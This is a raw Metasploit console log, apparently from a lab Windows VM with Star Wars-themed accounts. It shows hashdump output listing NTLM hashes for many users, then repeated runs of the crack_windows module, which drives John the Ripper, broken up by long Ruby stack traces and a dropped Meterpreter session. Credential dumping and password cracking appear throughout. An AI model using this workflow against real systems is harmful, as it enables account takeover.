+192.168.56.198  192.168.56.198  445/tcp (smb)  IEUser            aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  jabba_hutt        aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  jarjar_binks      aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  kylo_ren          aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  lando_calrissian  aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  leah_organa       aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  luke_skywalker    aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  SkipKiddie        aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  administrator     aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  guest             aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  ieuser            aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  skipkiddie        aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696         NTLM hash     nt,lm
+
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> use auxiliary/analyze/crack_w
+use auxiliary/analyze/crack_webapps  use auxiliary/analyze/crack_windows  
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> use auxiliary/analyze/crack_windows [K
+[0m[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> opto[Kions
+[0m
+Module options (auxiliary/analyze/crack_windows):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   CONFIG                                 no        The path to a John config file to use instead of the default
+   CRACKER_PATH                           no        The absolute path to the cracker executable
+   CUSTOM_WORDLIST                        no        The path to an optional custom wordlist
+   FORK                  1                no        Forks for John the Ripper to use
+   INCREMENTAL           true             no        Run in incremental mode
+   ITERATION_TIMEOUT                      no        The max-run-time for each iteration of cracking
+   KORELOGIC             false            no        Apply the KoreLogic rules to John the Ripper Wordlist Mode(slower)
+   LANMAN                true             no        Crack LANMAN hashes
+   MSCASH                true             no        Crack M$ CASH hashes (1 and 2)
+   MUTATE                false            no        Apply common mutations to the Wordlist (SLOW)
+   NETNTLM               true             no        Crack NetNTLM
+   NETNTLMV2             true             no        Crack NetNTLMv2
+   NORMAL                true             no        Run in normal mode (John the Ripper only)
+   NTLM                  true             no        Crack NTLM hashes
+   POT                                    no        The path to a John POT file to use instead of the default
+   USE_CREDS             true             no        Use existing credential data saved in the database
+   USE_DB_INFO           true             no        Use looted database schema info to seed the wordlist
+   USE_DEFAULT_WORDLIST  true             no        Use the default metasploit wordlist
+   USE_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace
+   USE_ROOT_WORDS        true             no        Use the Common Root Words Wordlist
+   WORDLIST              true             no        Run in wordlist mode
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   john  Use John the Ripper
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> run
+[0mCreated directory: /root/.john
+
+[1m[32m[+][0m john Version Detected: 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85: warning: Exception in finalizer #<Proc:0x00007fdcd22dca60 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry_subsystem/registry_key.rb:38>
+/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry_subsystem/registry_key.rb:42:in `rescue in block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry_subsystem/registry_key.rb:39:in `block in finalize'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `initialize'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `new'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `[]'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `block in column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `flat_map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:155:in `block in apply_column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1515:in `block in arel_columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `flat_map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `arel_columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1497:in `build_select'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1370:in `build_arel'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1283:in `arel'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:938:in `block (2 levels) in exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/finder_methods.rb:432:in `apply_join_dependency'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:932:in `block in exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:962:in `skip_query_cache_if_necessary'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:928:in `exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:914:in `block in exec_queries'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:962:in `skip_query_cache_if_necessary'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:908:in `exec_queries'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:695:in `load'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:250:in `records'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/lib/msf/core/auxiliary/password_cracker.rb:124:in `already_cracked_pass'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:337:in `block in hash_file'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:333:in `hash_file'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:239:in `run'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:178:in `job_run_proc'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:85:in `run_simple'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:96:in `run_simple'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb:69:in `cmd_run'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	from /usr/bin/msfconsole:23:in `<main>'
+/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry.rb:160:in `close_key'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry_subsystem/registry_key.rb:117:in `close'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/registry_subsystem/registry_key.rb:40:in `block in finalize'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `initialize'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `new'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/arel/table.rb:85:in `[]'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `block in column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:41:in `column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `flat_map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:27:in `columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/associations/join_dependency.rb:155:in `block in apply_column_aliases'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1515:in `block in arel_columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `flat_map'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1506:in `arel_columns'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1497:in `build_select'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1370:in `build_arel'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/query_methods.rb:1283:in `arel'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:938:in `block (2 levels) in exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/finder_methods.rb:432:in `apply_join_dependency'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:932:in `block in exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:962:in `skip_query_cache_if_necessary'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:928:in `exec_main_query'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:914:in `block in exec_queries'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:962:in `skip_query_cache_if_necessary'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:908:in `exec_queries'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:695:in `load'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation.rb:250:in `records'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/lib/msf/core/auxiliary/password_cracker.rb:124:in `already_cracked_pass'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:337:in `block in hash_file'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.2/lib/active_record/relation/delegation.rb:88:in `each'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:333:in `hash_file'
+	from /usr/share/metasploit-framework/modules/auxiliary/analyze/crack_windows.rb:239:in `run'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:178:in `job_run_proc'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:85:in `run_simple'
+	from /usr/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:96:in `run_simple'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb:69:in `cmd_run'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	from /usr/bin/msfconsole:23:in `<main>'
+[1m[34m[*][0m Hashes Written out to /tmp/hashes_tmp20230504-10618-8ij7lu
+[1m[34m[*][0m Wordlist file written out to /tmp/jtrtmp20230504-10618-s32r65
+[1m[34m[*][0m Checking lm hashes already cracked...
+[1m[34m[*][0m Cracking lm hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=FyEaojpp --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-s32r65 --rules=single /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Will run 2 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+0g 0:00:00:06 DONE (2023-05-04 19:03) 0g/s 2578Kp/s 2578Kc/s 2578KC/s MEX1900..E1900
+Session completed. 
+[1m[34m[*][0m Cracking lm hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=FyEaojpp --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+21g 0:00:00:00 DONE 2/3 (2023-05-04 19:04) 210.0g/s 457020p/s 457020c/s 9597KC/s 123456..NAHK
+Use the "--show --format=LM" options to display all of the cracked passwords reliably
+Session completed. 
+[1m[34m[*][0m Cracking lm hashes in incremental mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=FyEaojpp --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --incremental=Digits /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in wordlist mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=FyEaojpp --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-s32r65 --rules=wordlist /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[32m[+][0m Cracked Hashes
+==============
+
+ DB ID  Hash Type  Username       Cracked Password  Method
+ -----  ---------  --------       ----------------  ------
+ 18     lm         administrator                    Normal
+ 19     lm         guest                            Normal
+
+[1m[34m[*][0m Checking nt hashes already cracked...
+[1m[34m[*][0m Cracking nt hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=I9vitww3 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt --wordlist=/tmp/jtrtmp20230504-10618-s32r65 --rules=single /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+2g 0:00:00:06 DONE (2023-05-04 19:04) 0.3169g/s 13152Kp/s 13152Kc/s 213559KC/s zucchini1900..vagrant1900
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+[1m[34m[*][0m Cracking nt hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=I9vitww3 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt /tmp/hashes_tmp20230504-10618-8ij7lu
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+[1m[34m[*][0m 192.168.56.198 - Meterpreter session 1 closed.  Reason: Died
+^[[A    ^[[A    ^CWait...2g 0:00:35:47  3/3 0.000931g/s 39299Kp/s 39299Kc/s 628789KC/s djnvdj7f..djnvdvda
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session aborted
+[1m[31m[-][0m Stopping running against current target...
+[1m[34m[*][0m Control-C again to force quit all targets.
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> run
+[0m
+[1m[32m[+][0m john Version Detected: 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP
+[1m[34m[*][0m Hashes Written out to /tmp/hashes_tmp20230504-10618-xskfbc
+[1m[34m[*][0m Wordlist file written out to /tmp/jtrtmp20230504-10618-zn6l7j
+[1m[34m[*][0m Checking lm hashes already cracked...
+[1m[34m[*][0m Cracking lm hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=kj0PbB6Y --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-zn6l7j --rules=single /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=kj0PbB6Y --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in incremental mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=kj0PbB6Y --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --incremental=Digits /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in wordlist mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=kj0PbB6Y --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-zn6l7j --rules=wordlist /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[32m[+][0m Cracked Hashes
+==============
+
+ DB ID  Hash Type  Username  Cracked Password  Method
+ -----  ---------  --------  ----------------  ------
+
+[1m[34m[*][0m Checking nt hashes already cracked...
+[1m[34m[*][0m Cracking nt hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=x5l01aE6 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt --wordlist=/tmp/jtrtmp20230504-10618-zn6l7j --rules=single /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+0g 0:00:00:05 DONE (2023-05-04 19:40) 0g/s 14043Kp/s 14043Kc/s 210647KC/s zwelethu1900..vagrant1900
+Session completed. 
+[1m[34m[*][0m Cracking nt hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=x5l01aE6 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt /tmp/hashes_tmp20230504-10618-xskfbc
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+^CWait...0g 0:00:00:06  3/3 0g/s 30870Kp/s 30870Kc/s 493929KC/s lr2jor..lr2jen
+Session aborted
+[1m[31m[-][0m Stopping running against current target...
+[1m[34m[*][0m Control-C again to force quit all targets.
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> runoptionsuse auxiliary/analyze/crack_windowscreds[K[P[Pruncredsuse auxiliary/analyze/crack_windows
+[0m[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> use auxiliary/analyze/crack_windowsrun[Koptionsuse auxiliary/analyze/crack_windowsoptions[K
+[0m
+Module options (auxiliary/analyze/crack_windows):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   CONFIG                                 no        The path to a John config file to use instead of the default
+   CRACKER_PATH                           no        The absolute path to the cracker executable
+   CUSTOM_WORDLIST                        no        The path to an optional custom wordlist
+   FORK                  1                no        Forks for John the Ripper to use
+   INCREMENTAL           true             no        Run in incremental mode
+   ITERATION_TIMEOUT                      no        The max-run-time for each iteration of cracking
+   KORELOGIC             false            no        Apply the KoreLogic rules to John the Ripper Wordlist Mode(slower)
+   LANMAN                true             no        Crack LANMAN hashes
+   MSCASH                true             no        Crack M$ CASH hashes (1 and 2)
+   MUTATE                false            no        Apply common mutations to the Wordlist (SLOW)
+   NETNTLM               true             no        Crack NetNTLM
+   NETNTLMV2             true             no        Crack NetNTLMv2
+   NORMAL                true             no        Run in normal mode (John the Ripper only)
+   NTLM                  true             no        Crack NTLM hashes
+   POT                                    no        The path to a John POT file to use instead of the default
+   USE_CREDS             true             no        Use existing credential data saved in the database
+   USE_DB_INFO           true             no        Use looted database schema info to seed the wordlist
+   USE_DEFAULT_WORDLIST  true             no        Use the default metasploit wordlist
+   USE_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace
+   USE_ROOT_WORDS        true             no        Use the Common Root Words Wordlist
+   WORDLIST              true             no        Run in wordlist mode
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   john  Use John the Ripper
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> optionsuse auxiliary/analyze/crack_windowsrun[K
+[0m
+[1m[32m[+][0m john Version Detected: 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP
+[1m[34m[*][0m Hashes Written out to /tmp/hashes_tmp20230504-10618-tl5de3
+[1m[34m[*][0m Wordlist file written out to /tmp/jtrtmp20230504-10618-cf9a6z
+[1m[34m[*][0m Checking lm hashes already cracked...
+[1m[34m[*][0m Cracking lm hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=cpnabtG9 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-cf9a6z --rules=single /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=cpnabtG9 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in incremental mode...
